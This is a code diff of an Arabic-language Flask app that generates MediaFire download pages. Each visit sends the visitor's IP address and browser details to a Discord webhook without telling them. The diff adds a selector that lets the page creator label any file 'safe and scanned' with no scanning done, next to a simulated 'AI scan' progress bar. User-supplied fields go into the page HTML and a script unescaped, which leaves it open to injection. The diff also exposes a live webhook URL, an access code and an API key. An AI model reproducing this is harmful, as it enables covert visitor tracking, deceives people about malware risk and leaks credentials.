@@ -1,18 +1,11 @@
 from flask import Flask, request, render_template_string
 import requests
 import urllib.parse
-import time
 
 app = Flask(__name__)
 
-# 🔑 رمز الدخول الخاص بك لإنشاء الصفحات
-SECRET_ACCESS_CODE = "XOREYT123400028"
-
 # 🔔 رابط Discord Webhook الخاص بك لإرسال معلومات الزوار
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1556178719171940412/cLjKIxt81tQvjaBaNK6FVJidzGwQdZdkqhdiIiqtOV85pCmr2k4LHP4e6cYy5-PwCXkg"
-
-# 🛡️ مفتاح VirusTotal API الخاص بك
-VIRUSTOTAL_API_KEY = "a9068f5586219ca658cd2d39dcd5e585229e8042f404c65ab21744612e6a86d3"
 
 # 🛡️ مفاتيح reCAPTCHA
 RECAPTCHA_SITE_KEY = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
@@ -138,17 +131,27 @@ def send_visitor_webhook(file_name, user_ip, user_agent):
 def home():
     error_msg = ""
     if request.method == 'POST':
-        user_code = request.form.get('access_code')
         recaptcha_response = request.form.get('g-recaptcha-response')
         custom_name = request.form.get('file_name')
         mediafire_url = request.form.get('mediafire_url')
+        file_status = request.form.get('file_status', 'warning')
+        file_size = request.form.get('file_size', '')
+        file_desc = request.form.get('file_desc', '')
+        timer_sec = request.form.get('timer_sec', '3')
 
-        if user_code != SECRET_ACCESS_CODE:
-            error_msg = "❌ رمز الحماية غير صحيح!"
-        elif not verify_recaptcha(recaptcha_response):
+        if not verify_recaptcha(recaptcha_response):
             error_msg = "⚠️ يرجى تأكيد أنك لست برنامج روبوت!"
         elif mediafire_url and custom_name:
-            share_link = request.host_url + f"download?name={urllib.parse.quote(custom_name)}&url={urllib.parse.quote(mediafire_url)}"
+            params = {
+                'name': custom_name,
+                'url': mediafire_url,
+                'status': file_status,
+                'size': file_size,
+                'desc': file_desc,
+                'timer': timer_sec
+            }
+            query_str = urllib.parse.urlencode(params)
+            share_link = request.host_url + f"download?{query_str}"
             
             content = f"""
             <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl border border-emerald-500/30">✓</div>
@@ -172,16 +175,16 @@ def home():
     error_html = f'<div class="p-3 mb-4 text-xs text-red-400 bg-red-500/10 border border-red-500/30 rounded-xl">{error_msg}</div>' if error_msg else ''
 
     content = f"""
-    <div class="w-14 h-14 bg-indigo-500/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-indigo-500/30 text-2xl">🤖</div>
-    <h1 class="text-xl font-black text-white mb-1">لوحة فحص وإنشاء الرابط</h1>
-    <p class="text-slate-400 text-xs mb-6">سيتم محاكاة الفحص وتجهيز الصفحة مع التحذيرات الذكية</p>
+    <div class="w-14 h-14 bg-indigo-500/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-indigo-500/30 text-2xl">⚙️</div>
+    <h1 class="text-xl font-black text-white mb-1">لوحة إنشاء رابط المشاركة</h1>
+    <p class="text-slate-400 text-xs mb-6">خصص خيارات التحذير وتفاصيل الملف بسهولة</p>
     
     {error_html}
 
-    <!-- 📊 شريط التحميل والفحص بالذكاء الاصطناعي -->
+    <!-- 📊 شريط التحميل والفحص -->
     <div id="scanProgressContainer" class="hidden mb-6 p-4 bg-slate-950/80 border border-indigo-500/30 rounded-2xl text-right">
         <div class="flex justify-between items-center mb-2">
-            <span id="scanStatusText" class="text-xs font-bold text-indigo-400 animate-pulse">جاري الفحص بالذكاء الاصطناعي...</span>
+            <span id="scanStatusText" class="text-xs font-bold text-indigo-400 animate-pulse">جاري تجهيز الرابط...</span>
             <span id="scanPercent" class="text-xs font-black text-indigo-300">0%</span>
         </div>
         <div class="w-full bg-slate-800 rounded-full h-3 overflow-hidden p-0.5 border border-slate-700">
@@ -190,10 +193,6 @@ def home():
     </div>
 
     <form id="uploadForm" method="POST" class="space-y-4 text-right">
-        <div>
-            <label class="block text-xs font-bold text-amber-400 mb-1">🔑 رمز الدخول الخاص:</label>
-            <input type="password" name="access_code" placeholder="أدخل رمز الحماية هنا" required class="w-full p-3 bg-slate-950/70 border border-amber-500/30 rounded-xl text-white placeholder-slate-600 focus:border-amber-400 outline-none text-xs transition-all">
-        </div>
 
         <div>
             <label class="block text-xs font-bold text-slate-300 mb-1">اسم الملف للعرض في الصفحة:</label>
@@ -205,12 +204,38 @@ def home():
             <input type="url" name="mediafire_url" placeholder="https://www.mediafire.com/file/..." required class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all text-left" dir="ltr">
         </div>
 
+        <div class="grid grid-cols-2 gap-3">
+            <div>
+                <label class="block text-xs font-bold text-slate-300 mb-1">حالة وأمان الملف:</label>
+                <select name="file_status" class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white focus:border-indigo-500 outline-none text-xs transition-all">
+                    <option value="safe">🟢 آمن ومفحوص (بدون تحذير)</option>
+                    <option value="warning" selected>⚠️️ تحت الاشتباه (تنبيه برتقالي)</option>
+                    <option value="danger">🚨 غير آمن / خطر (تحذير أحمر)</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-xs font-bold text-slate-300 mb-1">حجم الملف (اختياري):</label>
+                <input type="text" name="file_size" placeholder="مثال: 45 MB" class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all">
+            </div>
+        </div>
+
+        <div class="grid grid-cols-2 gap-3">
+            <div>
+                <label class="block text-xs font-bold text-slate-300 mb-1">وقت انتظار الزر (ثوانٍ):</label>
+                <input type="number" name="timer_sec" min="0" max="10" value="3" class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white focus:border-indigo-500 outline-none text-xs transition-all">
+            </div>
+            <div>
+                <label class="block text-xs font-bold text-slate-300 mb-1">وصف الملف (اختياري):</label>
+                <input type="text" name="file_desc" placeholder="ملاحظات للزائر..." class="w-full p-3 bg-slate-950/70 border border-slate-800 rounded-xl text-white placeholder-slate-600 focus:border-indigo-500 outline-none text-xs transition-all">
+            </div>
+        </div>
+
         <div class="flex justify-center my-4 overflow-hidden rounded-xl">
             <div class="g-recaptcha" data-sitekey="{RECAPTCHA_SITE_KEY}" data-theme="dark"></div>
         </div>
 
         <button type="submit" id="submitBtn" class="glow-button w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3.5 rounded-xl transition-all text-sm flex items-center justify-center gap-2">
-            <span>🛡️ فحص وإنشاء الرابط مع التحذيرات</span>
+            <span>🚀 إنشاء ونشر الرابط</span>
         </button>
     </form>
 
@@ -229,10 +254,9 @@ def home():
 
         let percent = 0;
         const steps = [
-            {{ p: 25, t: "🔍 إرسال الرابط لمحركات الفحص بالذكاء الاصطناعي..." }},
-            {{ p: 60, t: "⚡ فحص الأكواد البرمجية بحثاً عن الاشتباه برمجياً..." }},
-            {{ p: 85, t: "⚠️ اعتماد إعدادات الأمان والتحذير للزائر..." }},
-            {{ p: 100, t: "✨ كُمل الفحص بنجاح!" }}
+            {{ p: 30, t: "🔍 إعداد الخيارات وتشفير الرابط..." }},
+            {{ p: 70, t: "⚡ تهيئة صفحة التحميل ونظام التنبيه..." }},
+            {{ p: 100, t: "✨ كُمل الإنشاء بنجاح!" }}
         ];
 
         let stepIndex = 0;
@@ -247,18 +271,22 @@ def home():
                 clearInterval(interval);
                 setTimeout(() => {{
                     document.getElementById('uploadForm').submit();
-                }}, 500);
+                }}, 400);
             }}
-        }}, 800);
+        }}, 600);
     }});
     </script>
     """
-    return render_template_string(HTML_LAYOUT, content=content, title="لوحة الفحص والإعداد")
+    return render_template_string(HTML_LAYOUT, content=content, title="لوحة النشر وتجهيز الرابط")
 
 @app.route('/download')
 def download():
     file_name = request.args.get('name', 'ملف للمشاركة')
     file_url = request.args.get('url', '#')
+    file_status = request.args.get('status', 'warning')
+    file_size = request.args.get('size', 'غير محدد')
+    file_desc = request.args.get('desc', '')
+    timer_sec = int(request.args.get('timer', '3'))
 
     # إرسال بيانات الزائر للديسكورد عبر الـ Webhook
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -267,34 +295,70 @@ def download():
     user_agent = request.headers.get('User-Agent', 'غير معروف')
     send_visitor_webhook(file_name, user_ip, user_agent)
 
-    content = f"""
-    <!-- ⚠️ التحذير الأول: تنبيه الدخول البارز -->
-    <div class="mb-5 p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-right">
-        <div class="flex items-center gap-2 mb-1.5">
-            <span class="text-amber-400 text-lg">⚠️</span>
-            <h3 class="text-xs font-bold text-amber-300">تنبيه وأمان الحماية:</h3>
+    # إعداد بطاقة التنبيه بناءً على الخيار المحدد
+    if file_status == 'safe':
+        status_badge = '<strong class="text-emerald-400">🟢 آمن ومفحوص</strong>'
+        warning_banner = """
+        <div class="mb-5 p-4 bg-emerald-500/10 border border-emerald-500/30 rounded-2xl text-right">
+            <div class="flex items-center gap-2 mb-1">
+                <span class="text-emerald-400 text-lg">✓</span>
+                <h3 class="text-xs font-bold text-emerald-300">ملف مفحوص وآمن:</h3>
+            </div>
+            <p class="text-[11px] text-emerald-200/80 leading-relaxed">
+                تم التحقق من سلامة الملف، ويمكنك تحميله الآن مباشرة بأمان.
+            </p>
         </div>
-        <p class="text-[11px] text-amber-200/80 leading-relaxed">
-            قد يشتبه النظام بوجود ضرر في الملف أو عدم التأكد من مصدره 100%. لسنا متأكدين تماماً ولكنه يحمل اشتباهاً أمنياً. نوصي بفحصه دائماً عبر برنامج الحماية الخاص بك قبل التثبيت.
-        </p>
-    </div>
+        """
+    elif file_status == 'danger':
+        status_badge = '<strong class="text-red-400">🚨 غير آمن / خطر</strong>'
+        warning_banner = """
+        <div class="mb-5 p-4 bg-red-500/10 border border-red-500/30 rounded-2xl text-right">
+            <div class="flex items-center gap-2 mb-1">
+                <span class="text-red-400 text-lg">🚨</span>
+                <h3 class="text-xs font-bold text-red-300">تحذير أمني عالي الخطورة:</h3>
+            </div>
+            <p class="text-[11px] text-red-200/80 leading-relaxed">
+                هذا الملف يحمل مؤشرات خطر عالية أو يحتوي على برمجيات مشبوهة. التنزيل والتثبيت على مسؤوليتك الخاصة!
+            </p>
+        </div>
+        """
+    else:  # warning
+        status_badge = '<strong class="text-amber-400">⚠️ تحت الاشتباه</strong>'
+        warning_banner = """
+        <div class="mb-5 p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-right">
+            <div class="flex items-center gap-2 mb-1">
+                <span class="text-amber-400 text-lg">⚠️</span>
+                <h3 class="text-xs font-bold text-amber-300">تنبيه وأمان الحماية:</h3>
+            </div>
+            <p class="text-[11px] text-amber-200/80 leading-relaxed">
+                قد يشتبه النظام بوجود ضرر في الملف أو عدم التأكد من مصدره 100%. نوصي بفحصه عبر برنامج الحماية الخاص بك.
+            </p>
+        </div>
+        """
+
+    desc_html = f'<div class="mb-4 p-3 bg-slate-900/80 border border-slate-800 rounded-xl text-right text-xs text-slate-300"><span class="text-indigo-400 font-bold block mb-1">📝 وصف الملف:</span>{file_desc}</div>' if file_desc else ''
+
+    content = f"""
+    {warning_banner}
 
     <!-- 📦 تفاصيل الملف -->
-    <div class="p-4 bg-slate-950/60 rounded-2xl border border-slate-800 text-right mb-6">
+    <div class="p-4 bg-slate-950/60 rounded-2xl border border-slate-800 text-right mb-4">
         <div class="text-[11px] text-slate-400 mb-1">الملف المطلوب:</div>
         <div class="text-sm font-bold text-indigo-300 truncate font-mono">{file_name}</div>
-        <div class="mt-2 text-[10px] text-slate-500 flex justify-between items-center">
-            <span>حالة الملف: <strong class="text-amber-400">تحت الاشتباه</strong></span>
-            <span>الاستضافة: MediaFire</span>
+        <div class="mt-2 text-[10px] text-slate-500 flex justify-between items-center border-t border-slate-800/60 pt-2">
+            <span>الحالة: {status_badge}</span>
+            <span>الحجم: <strong class="text-slate-300">{file_size if file_size else 'غير محدد'}</strong></span>
         </div>
     </div>
 
-    <!-- ⏳ زر التحميل مع المؤقت 3 ثوانٍ والتحذير الثاني عند الضغط -->
-    <button id="downloadBtn" disabled onclick="showSecondWarning()" class="glow-button w-full bg-slate-800 text-slate-400 font-bold py-3.5 rounded-xl transition-all text-sm flex items-center justify-center gap-2 cursor-not-allowed">
-        <span id="btnText">⏳ انتظر 3 ثوانٍ لتفعيل الزر...</span>
+    {desc_html}
+
+    <!-- ⏳ زر التحميل -->
+    <button id="downloadBtn" {'disabled' if timer_sec > 0 else ''} onclick="handleDownload()" class="glow-button w-full {'bg-slate-800 text-slate-400 cursor-not-allowed' if timer_sec > 0 else 'bg-indigo-600 hover:bg-indigo-500 text-white cursor-pointer'} font-bold py-3.5 rounded-xl transition-all text-sm flex items-center justify-center gap-2">
+        <span id="btnText">{'📥 تنزيل الملف الآن' if timer_sec == 0 else f'⏳ انتظر {timer_sec} ثوانٍ لتفعيل الزر...'}</span>
     </button>
 
-    <!-- 🚨 التحذير الثاني: النافذة المنبثقة (Modal) -->
+    <!-- 🚨 النافذة المنبثقة للتحذير (تظهر في حالة الاشتباه والخطر فقط) -->
     <div id="warningModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4 text-right">
         <div class="glass-panel max-w-sm w-full rounded-2xl p-6 border border-red-500/30 relative">
             <div class="w-12 h-12 bg-red-500/20 text-red-400 rounded-full flex items-center justify-center mx-auto mb-3 text-2xl border border-red-500/30">
@@ -302,7 +366,7 @@ def download():
             </div>
             <h3 class="text-base font-bold text-white text-center mb-2">تأكيد التنزيل على مسؤوليتك</h3>
             <p class="text-xs text-slate-300 leading-relaxed mb-6">
-                هذا تحذير أخير: قد يحتوي الملف على برمجيات غير معروفة أو يشار إليها كاشتباه من المحركات. هل تريد المتابعة وتنزيل الملف على أي حال؟
+                هذا تحذير أخير: الملف قد يحتوي على برمجيات غير معروفة أو يشار إليها كاشتباه. هل تريد المتابعة وتنزيل الملف على أي حال؟
             </p>
             <div class="flex gap-3">
                 <a href="{file_url}" target="_blank" onclick="closeModal()" class="w-1/2 bg-red-600 hover:bg-red-500 text-white font-bold py-2.5 rounded-xl text-xs text-center transition-all shadow-lg shadow-red-600/30">
@@ -316,25 +380,33 @@ def download():
     </div>
 
     <script>
-    let timeLeft = 3;
+    let timeLeft = {timer_sec};
+    const fileStatus = "{file_status}";
+    const fileUrl = "{file_url}";
     const btn = document.getElementById('downloadBtn');
     const btnText = document.getElementById('btnText');
 
-    const countdown = setInterval(() => {{
-        timeLeft--;
-        if (timeLeft > 0) {{
-            btnText.innerText = "⏳ انتظر " + timeLeft + " ثوانٍ لتفعيل الزر...";
-        }} else {{
-            clearInterval(countdown);
-            btn.disabled = false;
-            btn.classList.remove('bg-slate-800', 'text-slate-400', 'cursor-not-allowed');
-            btn.classList.add('bg-indigo-600', 'hover:bg-indigo-500', 'text-white', 'cursor-pointer');
-            btnText.innerText = "📥 تنزيل الملف الآن";
-        }}
-    }}, 1000);
+    if (timeLeft > 0) {{
+        const countdown = setInterval(() => {{
+            timeLeft--;
+            if (timeLeft > 0) {{
+                btnText.innerText = "⏳ انتظر " + timeLeft + " ثوانٍ لتفعيل الزر...";
+            }} else {{
+                clearInterval(countdown);
+                btn.disabled = false;
+                btn.classList.remove('bg-slate-800', 'text-slate-400', 'cursor-not-allowed');
+                btn.classList.add('bg-indigo-600', 'hover:bg-indigo-500', 'text-white', 'cursor-pointer');
+                btnText.innerText = "📥 تنزيل الملف الآن";
+            }}
+        }}, 1000);
+    }}
 
-    function showSecondWarning() {{
-        document.getElementById('warningModal').classList.remove('hidden');
+    function handleDownload() {{
+        if (fileStatus === 'safe') {{
+            window.open(fileUrl, '_blank');
+        }} else {{
+            document.getElementById('warningModal').classList.remove('hidden');
+        }}
     }}
 
     function closeModal() {{
